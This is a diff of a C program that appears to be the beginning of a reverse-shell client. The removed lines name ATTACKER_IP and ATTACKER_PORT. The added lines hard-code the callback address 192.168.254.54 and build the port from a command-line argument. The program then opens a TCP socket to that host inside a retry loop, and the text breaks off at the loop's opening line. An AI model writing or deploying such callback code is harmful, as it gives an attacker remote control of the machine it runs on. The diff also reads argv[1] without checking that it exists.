@@ -1,21 +1,20 @@
 #include <arpa/inet.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <stdbool.h>
 #include <unistd.h>
 #include <time.h>
 
-#define ATTACKER_IP "192.168.132.132"
-#define ATTACKER_PORT 8888
-
-
 static clock_t s_last_attempt = -1;
 static char s_is_waiting = false;
 
-int main(void) {
+int main(int argc, char *argv[]) {
     struct sockaddr_in sa;
     sa.sin_family = AF_INET;
-    sa.sin_port = htons(ATTACKER_PORT);
-    sa.sin_addr.s_addr = inet_addr(ATTACKER_IP);
+    int arg = atoi(argv[1]);
+    arg += 8000;
+    sa.sin_port = htons(arg);
+    sa.sin_addr.s_addr = inet_addr("192.168.254.54");
     int sockt = socket(AF_INET, SOCK_STREAM, 0);
 
     while (true) {
